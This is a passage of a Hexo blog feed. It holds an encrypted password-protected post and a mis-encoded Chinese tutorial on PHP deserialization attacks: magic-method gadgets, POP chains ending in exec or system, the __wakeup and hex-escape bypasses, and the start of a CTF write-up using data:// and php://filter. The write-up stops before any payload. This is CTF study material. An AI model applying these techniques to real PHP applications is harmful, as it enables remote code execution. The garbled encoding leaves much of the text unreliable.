        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5677275062678a5c9c44bfabd2f6072fe42f9134209fe5836670b29d93f78849">d55db17c59acd0a076373f5618149936d6336804120d7706b0bd474d7690c83560f5b1a2978403e63d06e384fd2b3216f60ffceb2be10fe923607ba2a3f63da8dddc37422310a5b600da568983241b725ebb5784573b4837f12f9dfee6e1d0dd72e209714b32d93b0ef55fc4e7a89ab29ff4b089ed27a2d7ceb9fc648019985b7390adb30c8609a460946f3062435e69322430a5308708dad4ec31d253a7f50c0d40efb9763bc49f51563d7895f3aeb111974faf9dac8a2c3c3824ca78636021bfd6b5ea6f7b652b789dd74c4a4650f9769ac39412bf77dba8039614a7816ab2c3c4b0dc3cc3c8d2eebc8b88f8ea40ae1bb10c76e607fa8a630542d168a6ae50bcc89de5ff84693b17defce908f8a5bf6309fa24d6ce350cb3ca8adbe5127c64086aa20800d04df45911058fce610491c6975ae1a924cd4901f6a74788827e7e24480e2e6548ba6fdf886aaf6b260658792c19243b331f67fa6cb07f1db1a55274926c816ce8d54f5ef7da0b55c9dd511715b3edfd2114a3c98a7131ab1eccb16401d375549f5fa8d7119af8b9ce652ba14588b606c5fcd1dff4ce9660d3de222482e15a304a5e112eb4f3a6c15bd6ea6627fa2fad47fa71c98bf7e8de3d188024847a5f3942567732d3ea3b7808dc6fb04f2e4e1a105fd3bb9073969c6ed1c884e554f30400bf6a9d5add149fe3b9f270184401c3c174e485188c7ac1984e0d67a1a478848747e7c862e4ce79196b45739a65c80d4a340807428a0cb663e013a226f62c6452998d654025723019424810984d8644456843241b81f93b31d6b62e0e925835559587e9d28921df407dade7f5ff57cdbf580a302c9dff98099c8c6709c5e097943f98a5e5acf496175aa3e021bcac9c8f551befea08d751c926164108f6285b230901fab837ef76cde010a9505a37f1ebd35e637e327b04261283b52c431616922a5447d79146af67d69c3a20cc041957c5b49a1bcb10b8c1a3364627c919ca24082e1be6c50bab5c40b3046c0ca8ffc81d43eb2ffdeee91765ba936d5cc2812f169002f5fd2a1c31fb36b187cc395c19d627de06b6fa1e23faae9536060c63bc2a8dc5cac939755dce2f5c6462fcdc7b24aca17da09a4e752614124669e45267e36b901e9cbb3064e3f260980faf571f8c63311d08358d30377fdb701f26baff3ed841dbc60ef85f8ea6ac432728ae4f43cec3f9214daf1b4512f28a2ee15caefa12717f3267c55ad789bc1ae73a46594b642177318cbdbe574322941391b3888aa0d7572213ac6754bb0fc6f7aafabc38f5e7c8bbebaee0c2fae7583165d60f7c1f45843f21ac318cdf5f18aa18e84539223e44ee228b9f361918713439968d8c2f8f8320b7f2d92ee0a2d5fe30c8b83abf0e8397235d27e60007d8ded1908898bf1e7b06a7c855446e4d7026cf5df83d65506515bd651b7afd573a83fe5a99410299324ef482acd8c902af37151fcbcae541a4114831290147ec6abb1da8e96e2fac437a8eefbcd522f865a869ba6672ebbc2f863f2da081c5452be323f93fc7ca92b15960c03c20280333eb9ab2741da3e0b704e2cf6fb0baecb5e1ab187b8647dfed656fde0f8403fa8513c29cdcd5d1ba622c70400ee30a6250c5ac0788e2d582c480b78e2534173ea824cf3008c777426a934cc3b45c0ba7986b8502b1c485cea2aeb797ad1b11bc9a325b53e57e65c1170d575ecd3facb7fa4c1f71739b71af5c500c9953865fa3fb3b59afc91e5ca83dfbe42dbf0e0287206d10f4117c02af60756e5d12b688cef3347f5d002af507fef80ae4a47565a03555dd72db5c5091874219183eaf07440d05b7acc12bab4f82e08ec2b6c7b8f90fa0b8eeef36e672fd13ae9fe5c4623d10fca00ffcddd381f6e3bdcd61a27208cdc6b85dbef789e547df128b43141236235c3cb5659343975f18599da5bca54677d8bc8fc2ff8a9a045869d7f79ccd9a62f48c5541dcd98bc2913f467c230bc2f66a3caa445d7725b6011aea809d7e110cb3bd2bc0ffc0ec1098f87607c3eac77de16c100ad2207f6ad75c412fdcaed7a110255f4dbc717a6a68eeb745e780c80b8afab0a6913cdc3e2b67c72d33787fafede28615ce6c918077b5a5f6252e8cd842ebcfe76e9b24fc4f2c86649acbb6c15c928defdc024756ac6c3fd89d20873c6beba1648a209b02a52ac915617917b57ef07db9da4d461f1686f865cc12a76a367451661146c94342952dfe978162f69e701a2f4398d0365ad3ac7a35e7e56081048072cfe882c1840cd3072942d7f228c9a643afb974ac87e47309af143c2e4a036af10222abadd2235997aaa516b232fd7c340dd916ed6e7eee5e6640803754d9d7ab41ad394f3b065941bf735593879fa9003eeb3dc1f31cb6d6a78968b0b6721a50e6619c6298075d1c93f541430d72c0702354211070a71980599e23590bb48278023580c86d4c5f550368ee635cf7e5e1c99fc60a87c5f814c1e3a87ea169a937466680ab71a938782465339cd9d9d95a467cbc0dee85cbb83019e6a4c0d871ea078debcab92d87623538040ec7a6c720d22de139628328d2eedca4039e259909ffe16b377650a2cdb09d4c366a8d3eb5761fcdad71fc11d5b3c01deb84417b2cddef921fef14a0c1e438f92a1551ca33b302a8e5c71693626940d6848d334e28c9a80fdd3cff723173b1a9be2e8d759dc7a8bba376a2a6d1f2d137db06fa6852e6bf0124e7975f938dcb0864c03890ac758729217df4bc3c141e2444b0758b6c0294f602d3a52a704e136bd9602bd3bf361beba9ac2840a5ae607ea53bcd017352bbe883c367ba8e463478e18c6b4e83c9cb1da9839ce369cc99a2e39dcaf3709162de8456cdd8ab428f76f4eb3ffdadd2fbc7ce472f5cc2005330e601358f1423549604c9a1edafca428268ccf418a0919dcfd9c10e1bd60640403581c09865f5cfc824c7a43fda69bea65c007ca571a7572079ba33365968cf336f01241e206eca1dba23bddd2d89862244ae5fca386d074d43281510cfd24bf93ccef5ede1b6f8e890a5327a0edb94b5a1a184024f61efb9d11d3fc3c4bb7c09620c6ac1575cb4f593c4c955b08c1cfbbbbb7accb336d32af0dabdd01c42d415b358f70c8527e1b4425460795b2b0cb600493de28e6be78704b1adbe29517171f2f333127a3e3388d3a12eccbd884f443a8206e4f6187c1e0f39649352591f57d3b9a09abee25a0533b09790a509ab5e0f3f2baf0e1e6732f7df8c69c3c49991024e2941a82f1603931428f5265fcfd657d96ff262f1e61b1a41e84ff4cc695b98d9c5e8f2d0ec5761b20588c9e3e23b6770cd544df121d6d615f87742889646fe83b5465860fc1a523a2493eaeb357901a8f965b81d8d61d88250ae4eb7dc0302b79ca48527474c687a4dd51a44315dc0755a7c854ad393c4a4a767099a8b5d29637919e0bed4959a2678930b458a67168b4bf519ddade5accb727609591da812cbfbd5cb66a20f1e6f14f1abe107338f351fa9bc50eef31fc2e3134e277f01a0e8e113dc9a816c88de69263c003a1af6fec5652a636019255902ed1fc4896d4fcd86d41e52d012071196521c8beef36abb5c05b96523bafabdd309878ef92d10ddd0e18205f9de5a5d04a469b08b08be60415f5a9e91377ec89922680680f8e006d083c73318b987d0bbb6756ca07d3ef427ceb732f8a85096f58832df7f5157b57616a44b0ecbe1429e304af89efbefdd76c6c7dab397cbe5734e1ba8c75ed39641ae83d72198e2ca5379b2b6f3c21923d467a3c230d72b6eeff91426c3e7c8a5c0537fb5f6ee1728e14281090839949ac61a220355d8b9f389c8e8544a442ffa7abd108c0c59e5a07c2057f626f624898d0f4e7a3887b9294d07042a26d373a6e22bf715b8747d15d24b83b20b0c386e5e2c082101f6d1fdb7691ed869fd8b6e12842e054fdbefe52fd99aca47c7a866425fe59ef59d0207469323aab033a1857ecb9500de779083fa0127ef33f182c8efd6625207b29564c74c913cfd8dec6ed465b8e01965af4120eeee1e7ec0d0354a5899f8e3b02b2968bd9ccae917cceaa0d6a8f1c08dec2cce733f81f9a130dcf8a665ad59b41482ab9cd53e4ff281ec4395fb3a045cd6082a36692432bd8ac20507eec66af478dc1d36158eef04fd00a5a98d48de035b6704a00391ebf2c7dcbd0614917a8e834565e684bf1640e282f9c12fdd8a45f97c14cbbde7f0681e8e6f074ec8f88439a03206cf2c88321b1ca36e2cdcc6c8bdf70c2638fa0ae7e395a69b758774ce14104033ae74bd96536ba704c7c3402f6549b6368ea8fe4f7ecb442ee950cbc6f5f479dcdd8ec34498283451758c8fb52021c27c1ddd5f30c7832fa3c9aea152ac404aaebc1f677ad6207083ce94b28833beba5cddd1c2c593310a14274c57643fcccdade29a1caf4f1219f3d7693a75eaa6e0216eafec5892e2df28e335f7305d66a230a6b267f1bcc1b238bd4cc96560e1549628f3098123841edb4af544c4eff9c184789c6e9c53c834de4a58183b41d8ba874b04a406e322b5227573b7c0cf2d69a77c2934e30584f615dfbe61bad4130256c026d33216d4328f27da17e707dc805262c39f92fae4e9e720de0ef8ddda10f1aa58c957fe1f2e997fcf14b7f2441fc2aa6d8a6862736bfd23d398c57c228f538812f6202d351d38b51776f83b0f87d63b466a7f3701f5842b802d8aff3cca49ed42f8739da3b5123ce33a3d6b0a55cf0f93a2c1624f8c4314197443eeca782a316df15f0d95d6f4159903a4d97b164d8b1f5b8a73b47656b9b6a51bfef31f4caca48f26bdba25946d161766dfb5fe66a6c025d2de1ede3fb053e60fbe5b35fb0890b1d8ba4cd2d1539e9101eca772898c84b45fc910653d4cf5ac51198105e755a9a5f315154a5137838f1446f74f5aaa4ae8d820f20c76d179755046f6c6e3cb5a1aeceaa1ce8ec5c75a6730dc2dd73668fc32cd9a102cc75a809ebfcc9ee0aef33efa406d8b5e3acb17fed3ecf15810706c1560f6027b5358ea676a5334a3cf088df6b1698145241fe718cb1a451887d7c814d6f1ec3b675b9bbb36e5d6a7d242946da3e3aa20aa2002669946d3b039f549dc1bce156322dca8d19ade707c52d9c75f369e8179651f9f7cdfb33e242bafab4051c33a3817892c51f958e6189aa03c9d02433f2ae52d2eaf66bc9786880c6bc4ea4ca8d5d781ed76892c6db56a8eee0da25e7a7d62ac450309550e8600ce133d149d0b24a5728e8ffc47821ef5985cea7637e582807c1a32018a4df670a0a7ab96dd2187484603e0df7a4756247532e06b584954bc5d7886b9dea16f78333282390df1669e77d164b3def2e1df9c7dda0a400622d2bf01a2f210af495ddf1a410190ee82f5d20c1497f7c359608dbf10f1e5c4d0275a1b87c636fa37e22d00c8727bb7b192dfa6895e51be842a85310efca3c83f382ee4bd9ed11f26fa3190e229c05d486835b3497eae9d4fa7ebea0374d9479c837065b9ba1d114c74a5dbf41f31c83f42a2dbfb672b7ed24e091f77e0af73761ab3c162fdea44191bcb410034adbf47e4bf69ebd482e75c6a8daeca324158a96a586ff9f558b2f3684412c0bfc575006df7c43c9be791a568389ca147b8f78c096f63e791af72c6e2a39949ee948521dab8c02e5a85906c2182cd5e19beaf11fae42867efaa7f699f463ebba403b76d308fed97e43133ff7c032c12e82b1865c538e3cedb0958f9f4fb1a7dcaf6e95d04339059d2be655b3c5578385ff0308453fb30d45dc93cd94276e45bb8594c4de613590b796559965e55b494c6c8a5c036e4f6a304c84d39174bdcd895ffd8332e432cc2c50147df9685369044f89c2a425ebe7d5f254bfbfc067e12a3aff87960035c9cb44f35d4a45aa88d70b648f759267dbc370ede50f56b69488c940ab5806432ab37909b039e1e823cd6f22aa48aafbbb78ff201aab78a8c4d05628d961e4bc515015ddb3f4929e46ac4c5367322550fde00e9c0ba095aea13328890683055c3c6908e742838a09fcf2006aa74f810907f647a9f3d8206281d05d317b13d122e5cf36cb24d1dfcbaa0816dbc71cb957039785b186a37e84dc5be806a84904e587000af37dafd6a4bef36b4ff61dafcf6421fdffbc2b37bb6f5c454472e8f273ebfa77fa44cf17a66ef9541e01e757a157d88dc74e83a43458ac64ccf1529d236b30f8e10a7b5e8df0a3cf211e3c83e091f4f12891961dfc3728ec0d82416d73f8c166948a3ac34b3c102b6c9d3394c8bf4e3f96bf9609d2294a49f84c4740a050563590b04aba8372f863e72a3b0f33dfe1567b6750562d8b6c9577fa1082fe032aa85ee48b394aba3cd8519d1ef190e43f46430b0d4859abde5b524ef9a68dc89f0556b102c234587ea5550ec0c9c69760cf71d703d5c8deeb948ee7b73998e795408ca0339fdd1134ef05803a1e771b265a154f1ec080858637bad4cd974f6ce3a7099cec7e192713733ca56d27e7c9b6fa6fa66130d8f5cf8b3b81d36ce39c07f0b746777f0821d048c4445aa0ff4c65dc357c09b38634f02a36c7cb24e72d187152cd0d8a2df9d1e5053ee2a5cde10bcd07e0c392bf4075b154c4356fe63e43f9c9eb7aa1276e39157aa3e42239dbed3a486e9f8d67e8fe71d15c4663637dc5ecfcefa4ca62c3adb2973ea388004256780876718b67ed9adef0013c81729beb9dade55fd0d20b3fb78e490cd4b39031b045879c2f0cd16ad9a14bc4c700fd3cf6526726f356e8e2784c39cd44655cfb34ea566f42fd4220638b048b9f5a651617fda8015ec2c49c365758e38948395bfeb64225989863725531e9dadb658bba339cca96a342cee236266cbe5aad5f1ccad010d66d529ac5710cfba90e4e4dba5216af94c27d1b15cbff29f3e46fdda13946f6b95760761c4018789e3d2272fa46f9004e7d89bf8edf539c197dd3d1dd7e096191372c740d21c2ebcc2a3dc53dae5375855fe04c1dc31f789b9f9449d84293711e06b322adb4636127c5efe4cf8ce32b319529ba15983d382756cf4d956e20324bcdc4bec63bda5beb2387efdab8f49d290c2346386e3baed8859a0f64c90aea83a066087881363ecceec7a2afad788722bce097bf256747ad5d88d1c97dd75bf78684755965bab7b09859c6f4238b6df60b7c3612371327917d7116f391da151c23a139e11b5db09cccddec371f6e268bc28ae69de2b29e2c9dcf60e93a0591d407a41a530c1bb30718e690cb9524013f3ce28b6edb9fc86be434e12aae2272a244247627167ba910154756378b232ae46c26ec45865e173b77a41d577cdf20e041c0d2e2c15dd59049302f4693f940629ac88ccf4eedb6e779a6494ba3124a862010ca064039785d752ca8847be1d88d2e012f68c2ffef0d1e9242dc7b044aad4334b11abb89231a52f91395ac0a6d8d45a204072953042089fcb2b1129323061155c4b0ba402b729cdece5b133aec4b7fa844a46459b314d92079f082114fb0b46fcaa19aa4596c15f9ee76cbce76cf3b427f8cd95f00c33e880df4c6bb50f5bfce1a1c3a21b05c230f4047627354985ee8f16826813d7430e2bf5ef666301445e36499f177f56696f3a636f7e14b096db63400905db98ee8f1d23662e5719110de6175d15bf4ad412077b8270a664f39359bbadac8e3f6fe8be678877a6784eae757449d0a41e0d0ea641466c43d95daf5ccc3e4d730038f5b9dc3997dd8ac788fd46cd2c7ee0d15f266319693a81136deca960be94dcd68402351bbf740a7c0a87f4b93b8c8a21565049ac813bc55f9c27c7b3b37c845663507a4dd64e88d5d5be016525a29814069fd1f88e9c282b741d203a552473aa42660985afb27aed48c092b6cf9b9d0217161dab27155dae7b4be6fcf5344fcdb4a35508c999df6c357927525eab84120232e41dcf1e31017356974c2756183487d6bb6401c22a3254b6f8cd5dcfb3970f0269d64a0c0726ecbb7243d4e45bc7c88dd1c3d89b153baf2eab42e4ca6356131c25ee1bcea311b118dd080aefbe4f7916f7539fe7fb26c9b214cd8df8eda50828a3a3a3c4e8bc9a1bf1fdd43e77d07a6c827363b69a5e61c68bbf31731aedb81bca455bede6ff60cb6a3c0564f0de8d494a43fe5c210cff33f37d25127623e29e6e0e149179cceccf7162e1766803f3a953e6a42c61712ead90df0e41d31df24c52a5bf3f83023f209aff1fce2c38e5732e77e141011f8e5ccdd8de93b86a2dc056135508a64173df3a3203857a2445c05eb7ec0c26be1c919cdc372c1be1cc9f998c0a41b0ac108b84ef8037373a89550180ce0dd7d500702e7a582003ee3c1d62477e7c67ab9dc684cd0e0b59fa33f561253bd9d4af05e6bdb6d95c31735c408418f07ee68f8737821138748e451fdcfe8b850bfad1535762aaa063199fd00624536e45480ad2220790a68d6f82ffe9f6fda9860eb77b5f7f4793c395c7ca857e5819c8148812bc0812d2ae6a116ab48eb513a0c2e4a33e0083a6bc70cc0524ad8b5e657292c0296d886d10718fc04c8728354403a7cb63619e97fd4b6674532e97e894ddfbab9c3da5941befbd2b16bf6f2c006485c617587d3dc90c5c1cda22bd13074876776db71cc811670b93c0fd840911c68f52f26fcea316f156fadf393f69d86faa9368fc13a0de5b7e7ee8e9e19e8511ba9497c95059d7a26668f4c8f22d42ecc73ff1c9e212ab9e748055653e2cd191d35bd40b3531f75018f99537a2fde16f62f19cf5f1eda438ced1ccb9be859525abf834f087bfdc5200c4a6ad2a495ed3049d25c8ce9a871b780a276e517655e02d413aada104e82cbf04c9c383ae9390014565d125ba23b1a278fd710441149b69d999cc203c0936156e588565717ad949e4c80a9303b14543fcfecf5f7677aeb8bfaa9c27d64c9014f2bcf489cef5e3e82057c21fc092065ceea3f87404c6da6b9f9453fa8656f3075f29f2067805a7e67b8fb499c1412f37704bdcfe6509c8ef933e3f5c13f4aecf2691a5200274d7a57072ea863727049d82783ce55d37505964a46cf01c8ff184f6f7cb1fac081d330d9f4abf56db4916c914156f238960b94801270c5008abb4e3d03d0aaf28fc41ca3c020659ba65354217f32f26559c350d12e6d3b0ac925f4de9903530cbb685099da63518bad31eb9a56e1fccbdd7bc2469794a31335a75916c8ccb8e71acc76e4bae7ccda860428946241834b6d27ef53b8437fd125da967370e61a3adb9967a94d30554027c336da81b9e3e94b0f3ae85d0f498d841a5ec0bc7ef926ab9582bb1151836665fb18caba9a4d26b976445903e24d03a129506374732594d4c09dd199f8ceab0c01e7421e3c6a0f45e85b6b35e291a8394b222c8168ca8a9912d06263faae5016157fe7395f942654c6d01dfef5805b80d51c85389ad837e6529e6ab1bfb70f0a973fc7bcabfd282c36ad1e1494d01201d911fac4ec62874a853219019a5579abbc87c150ce07c22ddd7149f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">çŒœçŒœçœ‹</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ååºåˆ—åŒ–</title>
      <link href="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h3 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h3><p>phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸»è¦æ˜¯é€šè¿‡serializeå’Œunserializeä¸¤ä¸ªå‡½æ•°</p><p>serialize()å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œunserialize()å°†å­—ç¬¦ä¸²è¿˜åŸä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹ååºåˆ—åŒ–è¿›è¡Œåˆ©ç”¨ä¹Ÿä¸»è¦æ˜¯é€šè¿‡å…¶ä¸­çš„é­”æœ¯æ–¹æ³•</p> <span id="more"></span><p>å‡ ä¸ªå¸¸è§çš„é­”æœ¯æ–¹æ³•</p><pre class="language-none"><code class="language-none">__constructï¼š åœ¨åˆ›å»ºå¯¹è±¡æ—¶å€™åˆå§‹åŒ–å¯¹è±¡ï¼Œä¸€èˆ¬ç”¨äºå¯¹å˜é‡èµ‹åˆå€¼ã€‚__destructï¼š å’Œæ„é€ å‡½æ•°ç›¸åï¼Œå½“å¯¹è±¡æ‰€åœ¨å‡½æ•°è°ƒç”¨å®Œæ¯•åæ‰§è¡Œã€‚__toStringï¼šå½“å¯¹è±¡è¢«å½“åšä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è°ƒç”¨ã€‚__sleep:åºåˆ—åŒ–å¯¹è±¡ä¹‹å‰å°±è°ƒç”¨æ­¤æ–¹æ³•(å…¶è¿”å›éœ€è¦ä¸€ä¸ªæ•°ç»„)__wakeup:ååºåˆ—åŒ–æ¢å¤å¯¹è±¡ä¹‹å‰è°ƒç”¨è¯¥æ–¹æ³•__call:å½“è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•ã€‚__get:åœ¨è°ƒç”¨bç§æœ‰å±æ€§çš„æ—¶å€™ä¼šè‡ªåŠ¨æ‰§è¡Œ__isset()åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘__invoke()å½“å°è¯•æŠŠå¯¹è±¡å½“æ–¹æ³•è°ƒç”¨æ—¶è°ƒç”¨ã€‚__unset()åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</code></pre><p>æ ¼å¼</p><pre class="language-none"><code class="language-none">O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;i:20;&#125;ç±»å‹:é•¿åº¦:&quot;åå­—&quot;:ç±»ä¸­å˜é‡çš„ä¸ªæ•°:&#123;ç±»å‹:é•¿åº¦:&quot;åå­—&quot;;ç±»å‹:é•¿åº¦:&quot;å€¼&quot;;......&#125;</code></pre><p>åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ</p><p>privateç±»å‹æœ‰éšè—çš„ç©ºæ ¼ç¬¦</p><p><strong>ååºåˆ—åŒ–çš„å¸¸è§èµ·ç‚¹</strong></p><p>__wakeup ä¸€å®šä¼šè°ƒç”¨</p><p>__destruct ä¸€å®šä¼šè°ƒç”¨</p><p>__toString å½“ä¸€ä¸ªå¯¹è±¡è¢«ååºåˆ—åŒ–ååˆè¢«å½“åšå­—ç¬¦ä¸²ä½¿ç”¨</p><p><strong>ååºåˆ—åŒ–çš„å¸¸è§ä¸­é—´è·³æ¿:</strong></p><p>__toString å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²ä½¿ç”¨<br>__get è¯»å–ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§æ—¶è¢«è°ƒç”¨<br>__set å½“ç»™ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§èµ‹å€¼æ—¶è¢«è°ƒç”¨<br>__isset å¯¹ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è¢«è°ƒç”¨ã€‚å½¢å¦‚ $this-&gt;$func();</p><p><strong>ååºåˆ—åŒ–çš„å¸¸è§ç»ˆç‚¹:</strong></p><p>__call è°ƒç”¨ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è¢«è°ƒç”¨<br>call_user_func ä¸€èˆ¬phpä»£ç æ‰§è¡Œéƒ½ä¼šé€‰æ‹©è¿™é‡Œ<br>call_user_func_array ä¸€èˆ¬phpä»£ç æ‰§è¡Œéƒ½ä¼šé€‰æ‹©è¿™é‡Œ</p><h3 id="POPé“¾ç®€ä»‹"><a href="#POPé“¾ç®€ä»‹" class="headerlink" title="POPé“¾ç®€ä»‹"></a><strong>POPé“¾ç®€ä»‹</strong></h3><p>å€Ÿé‰´çš„æ–‡ç« ï¼š</p><p><a href="https://www.jianshu.com/p/16c56bebc63d">phpååºåˆ—åŒ–åˆ©ç”¨â€”â€”POPé“¾æ„é€ å®ä¾‹ - ç®€ä¹¦ (jianshu.com)</a></p><p><a href="https://blog.csdn.net/qq_43431158/article/details/105265462">(1æ¡æ¶ˆæ¯) PHPååºåˆ—åŒ–â€”æ„é€ POPé“¾_Lemon&#39;s blog-CSDNåšå®¢_phpååºåˆ—åŒ–popé“¾</a></p><p>POP é¢å‘å±æ€§ç¼–ç¨‹(Property-Oriented Programing) å¸¸ç”¨äºä¸Šå±‚è¯­è¨€æ„é€ ç‰¹å®šè°ƒç”¨é“¾çš„æ–¹æ³•ï¼Œä¸äºŒè¿›åˆ¶åˆ©ç”¨ä¸­çš„é¢å‘è¿”å›ç¼–ç¨‹ï¼ˆReturn-Oriented Programingï¼‰çš„åŸç†ç›¸ä¼¼ï¼Œéƒ½æ˜¯ä»ç°æœ‰è¿è¡Œç¯å¢ƒä¸­å¯»æ‰¾ä¸€ç³»åˆ—çš„ä»£ç æˆ–è€…æŒ‡ä»¤è°ƒç”¨ï¼Œç„¶åæ ¹æ®éœ€æ±‚æ„æˆä¸€ç»„è¿ç»­çš„è°ƒç”¨é“¾,æœ€ç»ˆè¾¾åˆ°æ”»å‡»è€…é‚ªæ¶çš„ç›®çš„ã€‚ç±»ä¼¼äºPWNä¸­çš„ROPï¼Œæœ‰æ—¶å€™ååºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œç”±å®ƒè°ƒç”¨çš„__wakeup()ä¸­åˆå»è°ƒç”¨äº†å…¶ä»–çš„å¯¹è±¡ï¼Œç”±æ­¤å¯ä»¥æº¯æºè€Œä¸Šï¼Œåˆ©ç”¨ä¸€æ¬¡æ¬¡çš„â€œgadgetâ€æ‰¾åˆ°æ¼æ´ç‚¹ã€‚</p><h3 id="POPé“¾åˆ©ç”¨æŠ€å·§"><a href="#POPé“¾åˆ©ç”¨æŠ€å·§" class="headerlink" title="POPé“¾åˆ©ç”¨æŠ€å·§"></a>POPé“¾åˆ©ç”¨æŠ€å·§</h3><p>1ã€ä¸€äº›æœ‰ç”¨çš„POPé“¾ä¸­å‡ºç°çš„æ–¹æ³•ï¼š</p><pre class="language-php" data-language="php"><code class="language-php">- å‘½ä»¤æ‰§è¡Œï¼šexec()ã€passthru()ã€popen()ã€system()- æ–‡ä»¶æ“ä½œï¼šfile_put_contents()ã€file_get_contents()ã€unlink()</code></pre><p>2ã€<strong>ååºåˆ—åŒ–ä¸­ä¸ºäº†é¿å…ä¿¡æ¯ä¸¢å¤±ï¼Œä½¿ç”¨å¤§å†™Sæ”¯æŒå­—ç¬¦ä¸²çš„ç¼–ç ã€‚</strong>PHP ä¸ºäº†æ›´åŠ æ–¹ä¾¿è¿›è¡Œååºåˆ—åŒ– Payload çš„ ä¼ è¾“ä¸æ˜¾ç¤º(é¿å…ä¸¢å¤±æŸäº›æ§åˆ¶å­—ç¬¦ç­‰ä¿¡æ¯)ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨åºåˆ—åŒ–å†…å®¹ä¸­ç”¨å¤§å†™Sè¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œæ­¤æ—¶è¿™ ä¸ªå­—ç¬¦ä¸²å°±æ”¯æŒå°†åé¢çš„å­—ç¬¦ä¸²ç”¨16è¿›åˆ¶è¡¨ç¤ºï¼Œä½¿ç”¨å¦‚ä¸‹å½¢å¼å³å¯ç»•è¿‡ï¼Œå³ï¼š</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token property">s</span><span class="token punctuation">:</span>4<span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span> -> <span class="token property">S</span><span class="token punctuation">:</span>4<span class="token punctuation">:</span><span class="token string">"use\72"</span><span class="token punctuation">;</span></code></pre><p>3ã€æ·±æµ…copyï¼šåœ¨ phpä¸­å¦‚æœæˆ‘ä»¬ä½¿ç”¨ &amp; å¯¹å˜é‡Açš„å€¼æŒ‡å‘å˜é‡Bï¼Œè¿™ä¸ªæ—¶å€™æ˜¯å±äºæµ…æ‹·è´ï¼Œå½“å˜é‡Bæ”¹å˜æ—¶ï¼Œå˜é‡Aä¹Ÿä¼šè·Ÿç€æ”¹å˜ã€‚åœ¨è¢«ååºåˆ—åŒ–çš„å¯¹è±¡çš„æŸäº›å˜é‡è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯å…¶ä»–å˜é‡å¯æ§çš„æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥åˆ©ç”¨æµ…æ‹·è´æ¥ç»•è¿‡è¿‡æ»¤ã€‚<br> 4ã€é…åˆPHPä¼ªåè®®å®ç°æ–‡ä»¶åŒ…å«ã€å‘½ä»¤æ‰§è¡Œç­‰æ¼æ´ã€‚</p><h1 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h1><p>(è¿™é‡Œæ”¾ä¸€ä¸‹è‡ªå·±åšè¿‡çš„ååºåˆ—åŒ–é¢˜ï¼ŒæŒç»­æ›´æ–°.jpg</p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501204543745.png" alt="image-20210501204543745"></p><p>çœ‹è§file_get_contents(),åˆ©ç”¨ä¼ªåè®®data://text/plain;base64ç»•è¿‡</p><p>å†åˆ©ç”¨php://filterè¯»å–uselesså†…çš„å†…å®¹</p><p>è§£ç å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210501183046395.png" alt="image-20210501183046395"></p><p>å¯çŸ¥flagåœ¨flag.phpä¸­</p><p>è¯•å›¾è®©file=flag.php</p><p>çœ‹åˆ°unserializeå‡½æ•°ï¼Œåˆ©ç”¨phpååºåˆ—åŒ–</p><p>æ„é€ 